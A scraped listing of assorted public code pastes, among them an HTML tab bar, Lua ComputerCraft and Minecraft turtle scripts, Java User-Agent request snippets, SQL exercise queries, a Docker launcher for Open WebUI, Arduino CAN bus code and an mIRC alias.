FFieEG3p,Mobile Tab Bar HTML,TheiPhoneFan,HTML,Friday 5th of April 2024 04:51:58 PM CDT,"<!-- Created by TheiPhoneFan on 2024-04-05 -->
<!DOCTYPE html>
<html>

<head>
    <style>
        .bottom-tab-bar {
            background-image: url('https://theiphonefan.w3spaces.com/theme/pinstripes-1x.png');
            height: 55px;
            width: 98.5%;
            border-radius: 16px;
            position: fixed;
            bottom: 0;
            border: 1px solid grey;
        }

        .bottom-tab-bar img {
            height: 45px;
            margin: 5px;
        }

        .menu {
            padding: 0;
            margin: 0;
        }

        .menu li {
            display: inline;
            text-align: center;
        }

        a {
            text-decoration:none;
        }

        /* Implement this if you wish to only show the tab bar on mobile.
        @media screen and (min-width:750px) {
            .bottom-tab-bar {
                display: none;
            }
        }
        */
    </style>
</head>

<body>
    <div class=""bottom-tab-bar"">
        <ul class=""menu"">
            <!-- Articles Tab Button -->
            <li>
                <a href=""https://theiphonefan.w3spaces.com/articles.html"">
                    <img src=""https://theiphonefan.w3spaces.com/theme/glyphs/articles.png"">
                </a>
            </li>

            <!-- Clipart Tab Button -->
            <li>
                <a href=""https://theiphonefan.w3spaces.com/clipart.html"">
                    <img src=""https://theiphonefan.w3spaces.com/theme/glyphs/clipart.png"">
                </a>
            </li>

            <!-- My Photograhy Tab Button -->
            <li>
                <a href=""https://theiphonefan.w3spaces.com/my-photography.html"">
                    <img src=""https://theiphonefan.w3spaces.com/theme/glyphs/my-photography.png"">
                </a>
            </li>
        </ul>
    </div>
</body>

</html>"
x6uGuNex,INT-OS Installer Library,INTERNETORIAN,Lua,Friday 5th of April 2024 04:45:47 PM CDT,"-- INT-OS/Install_lib.lua
-- Centralized library file containing reusable functions for INT-OS Installation Wizard.

local utils = {}

-- Centers text on the screen.
function utils.centerText(text)
    local width, height = term.getSize()
    local x = math.floor((width / 2) - (#text / 2))
    local y = math.floor(height / 2)
    term.setCursorPos(x, y)
    term.write(text)
end

-- Clears the screen and prints a header at the top.
function utils.printHeader
    term.clear()
    term.setCursorPos(1, 1)
    term.write(""INT-OS (TM) ALPHA // Installation Media"")
    term.setCursorPos(1, 2)
    shell.run(""id"")
    term.setCursorPos(1, 4)
end

return functions"
wc8xEKwy,Untitled,dereksir,Java,Friday 5th of April 2024 04:39:10 PM CDT,"package com.example;

// import the required classes
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers; 

import java.util.List;
import java.util.Random;

public class Main {
    public static void main(String[] args) {
        // define a list of User-Agent strings
        List<String> USER_AGENTS = List.of(
            ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"",
            ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36""
            // Add more User-Agent strings as needed
        );
		//...
    }
}"
2STARAMa,"pastebin to text ""RAW""",Splash6687,C#,Friday 5th of April 2024 04:32:47 PM CDT,"using System.Collections;
using UnityEngine;
using UnityEngine.Networking;

public class PasteBinTextLoader : MonoBehaviour
{
    [SerializeField]
    private string pasteBinRawLink = ""YOUR_PASTEBIN_RAW_LINK_HERE"";

    [SerializeField]
    private GameObject[] targetGameObjects;

    private void Start()
    {
        StartCoroutine(LoadTextFromPasteBin());
    }

    private IEnumerator LoadTextFromPasteBin()
    {
        UnityWebRequest www = UnityWebRequest.Get(pasteBinRawLink);
        yield return www.SendWebRequest();

        if (www.result == UnityWebRequest.Result.Success)
        {
            string pasteBinText = www.downloadHandler.text;
            foreach (GameObject obj in targetGameObjects)
            {
                TextMesh textMesh = obj.GetComponent<TextMesh>();
                if (textMesh != null)
                {
                    textMesh.text = pasteBinText;
                }
                else
                {
                    Debug.LogWarning(""TextMesh component not found on GameObject: "" + obj.name);
                }
            }
        }
        else
        {
            Debug.LogError(""Failed to fetch PasteBin content: "" + www.error);
        }
    }
}
"
At33hTrQ,2988 - Campeonato Cearense,amaimon02,PL/SQL,Friday 5th of April 2024 04:23:46 PM CDT,"SELECT 
  name, 
  count(name) as matches, 
  sum(CAST(Vitorias AS int)) as victories,
  sum(CAST(Derrotas AS int)) as defeats, 
  sum(CAST(Empate AS int)) as draws, 
  (sum(CAST(Vitorias AS int)) * 3) + (sum(CAST(Empate AS int)) * 1) as score
FROM 
  (
    SELECT 	
      teams.name, 
      matches.team_1 as ID,
      (matches.team_1_goals > matches.team_2_goals) as Vitorias, 
      (matches.team_1_goals < matches.team_2_goals) as Derrotas, 
      (matches.team_1_goals = matches.team_2_goals) as Empate 
    FROM 
      teams 
      INNER JOIN matches ON matches.team_1 = teams.id 
    UNION ALL 
    SELECT 
      teams.name, 
      matches.team_2 as ID, 
      (matches.team_2_goals > matches.team_1_goals) as Vitorias, 
      (matches.team_2_goals < matches.team_1_goals) as Derrotas, 
      (matches.team_2_goals = matches.team_1_goals) as Empate 
    FROM 
      teams 
      INNER JOIN matches ON matches.team_2 = teams.id
  ) as tabela 
GROUP BY 
  name
ORDER BY
	score DESC;"
jMnEfJh1,2989 - Departamentos e Divisões,amaimon02,PL/SQL,Friday 5th of April 2024 04:18:18 PM CDT,"SELECT 
  departamento.nome, 
  divisao.nome, 
  emp_calculado.media, 
  emp_calculado.salario 
FROM 
  (
    SELECT 
      empregado.lotacao_div, 
      CAST(
        AVG(
          (
            COALESCE(t_vencimento.Vencimento, 0) - COALESCE(t_desconto.Desconto, 0)
          )
        ) AS decimal(8, 2)
      ) AS media, 
      CAST(
        MAX(
          (
            COALESCE(t_vencimento.Vencimento, 0) - COALESCE(t_desconto.Desconto, 0)
          )
        ) AS decimal(8, 2)
      ) as salario 
    FROM 
      empregado 
      LEFT JOIN (
        SELECT 
          emp_desc.matr, 
          SUM(desconto.valor) AS Desconto 
        FROM 
          desconto 
          INNER JOIN emp_desc ON desconto.cod_desc = emp_desc.cod_desc 
        GROUP BY 
          emp_desc.matr
      ) as t_desconto ON empregado.matr = t_desconto.matr 
      LEFT JOIN (
        SELECT 
          emp_venc.matr, 
          SUM(vencimento.valor) AS Vencimento 
        FROM 
          vencimento 
          INNER JOIN emp_venc ON vencimento.cod_venc = emp_venc.cod_venc 
        GROUP BY 
          emp_venc.matr
      ) as t_vencimento ON empregado.matr = t_vencimento.matr 
    GROUP BY 
      lotacao_div
  ) AS emp_calculado 
  INNER JOIN divisao ON divisao.cod_divisao = emp_calculado.lotacao_div 
  INNER JOIN departamento ON divisao.cod_dep = departamento.cod_dep 
ORDER BY 
  emp_calculado.media DESC;
"
9Dch6ng1,OpenWebUI-Script,Foliver57,Bash,Friday 5th of April 2024 04:11:22 PM CDT,"# This script is used to manage the open-webui Docker container.
# It performs the following steps:
#
# Verifies the existence of the specified local directory for mounting to the container.
# Verifies the existence of the specified container name and image name.
# Retrieves the latest image from the Docker registry, if not already present or if an update is available.
# If no container with the specified name is running, it launches a new container using the latest image.
# If a container with the specified name is running and the image has been updated, it stops and removes the existing container, then launches a new container using the latest image.

# ANSI escape codes for colored output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color



# Configuration Variables
OBSIDIAN_FOLDER_PATH=""/mnt/c/Users/MyWindowsUser/Documents/Obsidian Vault/""
INTERNAL_SCAN_FOLDER_PATH=""/app/backend/data/docs/obsidian-vault""
CONTAINER_NAME=""open-webui""
IMAGE_NAME=""ghcr.io/open-webui/open-webui:main""
OPENAI_API_KEY=""sk-YOUR-KEY-HERE""
# Default open-webui docker run command
# docker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main

# device type for whisper tts and embbeding models - ""cpu"" (default), ""cuda"" (nvidia gpu and CUDA required) or ""mps"" (apple silicon) - choosing this right can lead to better performance
# We must pass this as an environment variable to the container
RAG_EMBEDDING_MODEL_DEVICE_TYPE=""cpu""

# Check if docker is installed
if ! [ -x ""$(command -v docker)"" ]; then
  echo -e ""${RED}Error: docker is not installed.${NC}"" >&2
  exit 1
fi

# Check if the local directory exists
if [ ! -d ""$OBSIDIAN_FOLDER_PATH"" ]; then
    echo -e ""${RED}Directory $OBSIDIAN_FOLDER_PATH does not exist.${NC}""
    exit 1
fi

# Check if Docker is installed and running
if ! docker info >/dev/null 2>&1; then
    echo -e ""${RED}Docker is not installed or not running.${NC}""
    exit 1
fi

# Check if the user has the necessary permissions to interact with Docker
if ! docker ps >/dev/null 2>&1; then
    echo -e ""${RED}You do not have the necessary permissions to interact with Docker.${NC}""
    exit 1
fi

echo -e ""${YELLOW}Pulling the latest image...${NC}""
docker pull $IMAGE_NAME

# Get the ID of the latest image
LATEST_IMAGE_ID=$(docker inspect --format=""{{.Id}}"" $IMAGE_NAME)

# Check if a container with the specified name exists
if [ ""$(docker ps -aq -f name=$CONTAINER_NAME)"" ]; then
    # Get the ID of the image used by the existing container
    CONTAINER_IMAGE_ID=$(docker inspect --format=""{{.Image}}"" $CONTAINER_NAME)

    # If the existing container is not using the latest image, or if it's not currently running, stop and remove it
    if [ ""$CONTAINER_IMAGE_ID"" != ""$LATEST_IMAGE_ID"" ] || ! docker ps -q -f name=$CONTAINER_NAME >/dev/null 2>&1; then
        echo -e ""${YELLOW}Stopping and removing existing container...${NC}""
        docker stop $CONTAINER_NAME
        docker rm $CONTAINER_NAME
    else
        # If the existing container is using the latest image and is currently running, there's nothing more to do
        echo -e ""${GREEN}Container is up to date and running.${NC}""
        exit 0
    fi
fi

# Launch a new container
echo -e ""${YELLOW}Launching a new container...${NC}""
docker run -d -p 3000:8080 --gpus all --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data -v ""$OBSIDIAN_FOLDER_PATH"":""$INTERNAL_SCAN_FOLDER_PATH"" --name open-webui --restart always -e OPENAI_API_KEY=""$OPENAI_API_KEY"" -e RAG_EMBEDDING_MODEL_DEVICE_TYPE=""$RAG_EMBEDDING_MODEL_DEVICE_TYPE"" $IMAGE_NAME
echo -e ""${GREEN}Container launched successfully.${NC}"""
Vf1E1Sir,Untitled,dereksir,Java,Friday 5th of April 2024 03:51:07 PM CDT,"package com.example;

// import the required classes
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers; 

public class Main {
    public static void main(String[] args) {
        // create an instance of HttpClient
        HttpClient client = HttpClient.newHttpClient();
        // build request using the Request Builder
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create(""http://httpbin.io/user-agent""))
            .header(""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"") // set the User-Agent header
            .build();
        // send request asynchronously and print response to the console
        client.sendAsync(request, BodyHandlers.ofString()) 
            .thenApply(HttpResponse::body)
            .thenAccept(System.out::println)
            .join();
    }
}"
JGUmHD6f,Untitled,dereksir,Java,Friday 5th of April 2024 03:45:37 PM CDT,"// create an HttpRequest instance
HttpRequest request = HttpRequest.newBuilder()
    .uri(URI.create(""https://httpbin.io/user-agent""))
	// set custom user agent header
    .header(""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"") // set the User-Agent header
    .build(); // build request"
ncuSH8dQ,Untitled,dereksir,Java,Friday 5th of April 2024 03:15:47 PM CDT,"package com.example;

// import the required classes
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers; 

public class Main {
    public static void main(String[] args) {
        // create an instance of HttpClient
        HttpClient client = HttpClient.newHttpClient();
        // build request using the Request Builder
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create(""http://httpbin.io/user-agent""))
            .build();
        // send request asynchronously and print response to the console
        client.sendAsync(request, BodyHandlers.ofString()) 
            .thenApply(HttpResponse::body)
            .thenAccept(System.out::println)
            .join();
    }
}"
GeriGBYE,Untitled,Mysoft,FreeBasic,Friday 5th of April 2024 02:54:57 PM CDT,"#include ""crt.bi""
#include ""windows.bi""

SetConsoleOutputCP(CP_UTF8)
SetConsoleCP(CP_UTF8)

sub PrintUTF8( sText as string )
  dim as DWORD dwLen = len(sText)
  WriteConsole( GetStdHandle(STD_OUTPUT_HANDLE) , strptr(sText) , dwLen , @dwLen , NULL )
end sub
  
PrintUTF8( !""Grégori Macário Harbs\n"" )
"
xNFzZwqq,emacs multi-yank,mark-naylor-1701,Lisp,Friday 5th of April 2024 02:39:53 PM CDT,"(defun multi-yank (n)
  ""Yank the head of the kill-ring n times.""
  (interactive ""p"")
  (dotimes (_ n) (yank)))
"
Nwk8bEzp,Tractor unit CAN code,ve2hkw,Arduino,Friday 5th of April 2024 02:13:40 PM CDT,"#include ""AA_MCP2515.h""
#include ""PGN.h""
#include <LCD-I2C.h>

#define UP_BUTTON_PIN 5
#define DOWN_BUTTON_PIN 4
#define MASTER_SWITCH_PIN A0

// TODO: modify CAN_BITRATE, CAN_PIN_CS(Chip Select) pin, and CAN_PIN_INT(Interrupt) pin as required.
const CANBitrate::Config CAN_BITRATE = CANBitrate::Config_8MHz_500kbps;
const uint8_t CAN_PIN_CS = 10;
const int8_t CAN_PIN_INT = 2;

uint8_t valvePins[4] = {9, 8, 7, 6};
uint8_t pinMask = B11111110;

volatile uint32_t previousMillis = 0;
const uint16_t interval = 150;

uint8_t bitShiftMask[] = {56, 48, 40, 32, 24, 16, 8, 0};

CANConfig config(CAN_BITRATE, CAN_PIN_CS, CAN_PIN_INT);
CANController CAN1(config);

LCD_I2C lcd(0x27, 20, 4);

void setup() {
  lcd.begin();
  lcd.display();
  lcd.backlight();
  
  Serial.begin(115200);

  while(CAN1.begin(CANController::Mode::Normal) != CANController::OK) {
    lcd.setCursor(0, 0);
    lcd.print(""CAN Controller fault"");
    lcd.setCursor(0, 1);
    lcd.print(""Retrying in 1 second"");
    delay(1000);
    lcd.clear();
  }
  lcd.setCursor(0,0);
  lcd.print(""CAN Controller OKAY"");
  delay(500);
  lcd.clear();

  Serial.println(sizeof(valvePins));

  for (int i = 0; i<sizeof(valvePins); i++){
    pinMode(valvePins[i], INPUT_PULLUP);
  }
  pinMode(UP_BUTTON_PIN, INPUT_PULLUP);
  pinMode(DOWN_BUTTON_PIN, INPUT_PULLUP);
  pinMode(MASTER_SWITCH_PIN, INPUT_PULLUP);

  
}

void loop() {

  CANFrame frame;
  if (CAN1.read(frame) == CANController::IOResult::OK) {
    frame.print(""RX: "");
    uint32_t id = frame.getId();
    uint8_t dlc = frame.getDlc();
    uint8_t *packet = frame.getData();
    uint8_t dataArray[dlc];
    for (uint8_t i = 0; i<dlc; i++){
      dataArray[i] = *(packet++);
    }

    switch(id) {
      case PRESSURE_PGN:
        uint16_t pressure =  
        (dataArray[4] << 24) | 
        (dataArray[5] << 16) | 
        (dataArray[6] << 8) | 
        (dataArray[7]);
        pressureRead(pressure);
        break;
      
      case FLOW_PGN:
        
        break;
      
      case SPEED_PGN:
        
        break;
      
    }
  }

  uint32_t currentMillis = millis();

  if (currentMillis - previousMillis >= interval) {
    previousMillis = currentMillis;
    uint8_t valveMessage = 0;
    for (int i=0; i<sizeof(valvePins); i++){
      uint8_t var = digitalRead(valvePins[i]);
      uint8_t var2 = var^pinMask; //XOR with B11111110 to produce the inverse, then
      uint8_t var3 = ~var2; // perform a NOT to flip the bits back. This is so we can invert a HIGH input to a 0 in our PGN Byte
      valveMessage |= var3 << i;
    }
    
    uint8_t data2[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, valveMessage};
  
    CANFrame valveFrame(VALVE_PGN, data2, sizeof(data2));
    CAN1.write(valveFrame);
    valveFrame.print(""TX: "");

   bool upbtn = digitalRead(UP_BUTTON_PIN);
   bool downbtn = digitalRead(DOWN_BUTTON_PIN);
   

   if (!upbtn && downbtn) {
    uint8_t UDPacket[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA};
    CANFrame UDFrame(UP_DOWN_PGN, UDPacket, sizeof(UDPacket));
    CAN1.write(UDFrame);
    UDFrame.print(""TX: "");
   }
   else if (upbtn && !downbtn) {
    uint8_t UDPacket[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55};
    CANFrame UDFrame(UP_DOWN_PGN, UDPacket, sizeof(UDPacket));
    CAN1.write(UDFrame);
    UDFrame.print(""TX: "");
   }
   else {
    uint8_t UDPacket[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    CANFrame UDFrame(UP_DOWN_PGN, UDPacket, sizeof(UDPacket));
    CAN1.write(UDFrame);
    UDFrame.print(""TX: "");
   }
 

  bool masterSwitch = digitalRead(MASTER_SWITCH_PIN);
    /*The switch is connected to ground and pulls the pin low when set to on.
     Because of this, we want to invert the bool to make it make more sense in our heads here*/
    if (!masterSwitch == true){
      uint8_t MPacket[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA};
      CANFrame MFrame(MASTER_SWITCH_PGN, MPacket, sizeof(MPacket));
      CAN1.write(MFrame);
      MFrame.print(""TX: "");
    }
    else if (!masterSwitch == false){
      uint8_t MPacket[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55};
      CANFrame MFrame(MASTER_SWITCH_PGN, MPacket, sizeof(MPacket));
      CAN1.write(MFrame);
      MFrame.print(""TX: "");
    }
 
  }
}


void pressureRead(uint16_t pressure) {
  lcd.clear();

  double bar = pressure/1000.0;
  
  lcd.print(bar);
}
"
VQzLt440,CC:Tweaked Mooshroom Milker,timconspicuous,Lua,Friday 5th of April 2024 01:49:49 PM CDT,"--to use place inventory with oak logs or bowls above a crafty turtle, a target inventory below and a mooshroom in front

function CraftBowl(item)
    --adding some additional checks in case the loop is interrupted while crafting
    if item.name == ""minecraft:oak_log"" then
		if item.count == 3 then
        	turtle.craft(3)
		else
			turtle.suckUp(3 - item.count)
		end
    elseif (item.name == ""minecraft:oak_planks"") and (item.count % 4 == 0) then
        if item.count == 12 then
            turtle.transferTo(3,4)
        elseif item.count == 8 then
            turtle.transferTo(6,4)
        elseif item.count == 4 then
            turtle.craft(4)
        end
    else
        print(""Something went wrong, empty inventory and try again."")
    end
end

while true do
    item = turtle.getItemDetail(1)
	if turtle.getItemCount(2) > 0
		turtle.select(2)
		turtle.dropDown()
	end
	turtle.select(1)
    if item == nil then
        turtle.suckUp(3)
    elseif item.name == ""minecraft:bowl"" then
        turtle.place()
    elseif item.name == ""minecraft:mushroom_stew"" then
        turtle.dropDown()
    else
        CraftBowl(item)
    end
    os.sleep(.5)
end"
8evb5nVE,Untitled,The_Unpunished,C#,Friday 5th of April 2024 12:28:57 PM CDT,"using System;

enum LinkType
{
    YOUTU_DOT_BE,
    YOUTUBE_DOT_COM,
    YOUTUBE_DOT_COM_NO_W,
    FUCKEDUP
}

public class CPHInline
{

    const string baseLink = ""https://www.youtube.com/watch?v="";
    const string youtuBe = ""https://youtu.be"";
    const string youtubeCom = ""https://www.youtube.com"";
    const string youtubeComNoW = ""https://youtube.com"";
    const string emptyString = """";
    const string http = ""http://"";
    const string https = ""https://"";
    const char ampersand = '&';
    const char questionMark = '?';
    const char forwardsSlash = '/';
    const string watchKey = ""v="";

    public bool Execute()
    {
        string beforeFilter = args[""beforeFilter""].ToString();
        string afterFilter = MakeHttps(beforeFilter);
        LinkType linkType = determineLinkType(afterFilter);
        if(linkType == LinkType.YOUTUBE_DOT_COM_NO_W){
            afterFilter = addWww(afterFilter);
            linkType = LinkType.YOUTUBE_DOT_COM;
        }
        afterFilter = FilterLink(afterFilter, linkType);
        bool hasFuckedUpLink = linkType == LinkType.FUCKEDUP || afterFilter.Equals(emptyString);
        CPH.SetArgument(""requestHasFuckedUpLink"", hasFuckedUpLink);
        CPH.SetArgument(""filteredYouTubeLink"", ((hasFuckedUpLink) ? beforeFilter : afterFilter));
        return true;
    }

    string MakeHttps(string httpLink)
    {
        if(!httpLink.StartsWith(https, System.StringComparison.CurrentCultureIgnoreCase)
            && httpLink.StartsWith(http, System.StringComparison.CurrentCultureIgnoreCase))
            return https + httpLink.Substring(http.Length, httpLink.Length - http.Length);
        return httpLink;
    }

    LinkType determineLinkType(string httpsLink)
    {
        if(httpsLink.StartsWith(youtuBe, System.StringComparison.CurrentCultureIgnoreCase))
            return LinkType.YOUTU_DOT_BE;
        if(httpsLink.StartsWith(youtubeCom, System.StringComparison.CurrentCultureIgnoreCase))
            return LinkType.YOUTUBE_DOT_COM;
        if(httpsLink.StartsWith(youtubeComNoW, System.StringComparison.CurrentCultureIgnoreCase))
            return LinkType.YOUTUBE_DOT_COM_NO_W;
        return LinkType.FUCKEDUP;
    }

    string addWww(string httpsLink){
        return https + ""www"" + httpsLink.Substring(https.Length, httpsLink.Length - https.Length);
    }

    string FilterLink(string httpsLink, LinkType linkType)
    {
        string result = emptyString;
        string watchValue = emptyString;
        if(linkType != LinkType.FUCKEDUP)
            watchValue = parseWatchValue(httpsLink, linkType);
        if(!watchValue.Equals(emptyString))
            result = CPH.UrlEncode(baseLink + watchValue);
        return result;
    }

    string parseWatchValue(string ytLink, LinkType linkType){
        string parameterString = emptyString;
        string ytBase = """";
        switch(linkType){
            case LinkType.YOUTU_DOT_BE:{
                ytBase = youtuBe;
                break;
            }
            case LinkType.YOUTUBE_DOT_COM:{
                ytBase = youtubeCom;
                break;
            }
            default:{
                return emptyString;
            }
        }
        if(ytBase.Length >= ytLink.Length)
            return emptyString;
        parameterString = ytLink.Substring(ytBase.Length);
        if(parameterString.Length <= 1)
                return emptyString;
        switch(linkType){
            case LinkType.YOUTU_DOT_BE:{
                if(parameterString[1] == questionMark)
                    return emptyString;
                if(parameterString.Contains(questionMark.ToString()))
                    return parameterString.Substring(1, parameterString.IndexOf(questionMark) - 1);
                else
                    return parameterString.Substring(1);
                break;
            }
            case LinkType.YOUTUBE_DOT_COM:{
                if(!parameterString.Contains(watchKey))
                    return emptyString;
                parameterString = parameterString.Substring(parameterString.IndexOf(watchKey) + watchKey.Length);
                if(parameterString.Contains(ampersand.ToString()))
                    return parameterString.Substring(0, parameterString.IndexOf(ampersand));
                else
                    return parameterString;
                break;
            }
        }
        return emptyString;
    }
}
"
XcbBGLJx,markasread,Tiago_f,mIRC,Friday 5th of April 2024 12:09:18 PM CDT,"alias checkwinstate {
  var %sco = $scon(0)
  while (%sco >= 1) {
    .scid $scon(%sco)
    var %x = 1, %y = $window( *, 0)
    while ( %x <= %y ) {
      if ($window( *, %x).sbcolor == message) || ($window( *, %x).sbcolor == event) { return 1 }
      inc %x
    }
    dec %sco
  }
  .scid -r
}
menu menubar,status {
  $iif($checkwinstate != 1,$style(2)) &Mark As Read :scon -a markasread
}"
